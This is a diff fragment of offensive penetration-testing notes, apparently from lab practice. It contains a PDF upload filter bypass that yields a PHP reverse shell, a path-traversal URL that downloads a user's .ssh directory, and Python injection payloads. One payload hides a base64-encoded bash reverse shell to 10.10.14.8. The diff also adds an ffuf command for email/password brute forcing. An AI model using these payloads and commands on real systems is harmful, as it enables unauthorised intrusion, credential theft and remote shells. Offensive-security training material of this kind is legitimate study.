@@ -194,7 +194,7 @@ THINK ABOUT RCE WHENEVER YOU HAVE LFI.
 
 THINK ABOUT LOCAL FILE INCLUSION.
 
-For PDF bypass, try to add the "%PHP 1.7\n%" thing at the top and change the name to reverse.pdf.php.
+For PDF bypass, try to add the "%PHP-1.7\n%" thing at the top and change the name to reverse.pdf.php.
 
 ```bash
 http://192.168.180.231/?cwd=../../../../../../../../home/remi&file=.ssh&download=true
@@ -331,6 +331,12 @@ ffuf -request search.req -request-proto http -w /opt/SecLists/Fuzzing/special-ch
 &query=sup')%2Bprint('hi')%23
 &query=sup')%2B__import__('os').system('id')%23
 &query=sup')%2B__import__('os').system('echo%20-n%20YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC84MCAwPiYxICcK%20|base64%20-d|bash')%23
+```
+
+Multiple paramaters:
+
+```bash
+ffuf -request search.req -request-proto http -w emails.txt:USER -w ../../passwords.txt:PASS
 ```
 
 Fuzzing directly in URL, in this case, testing for parameters.
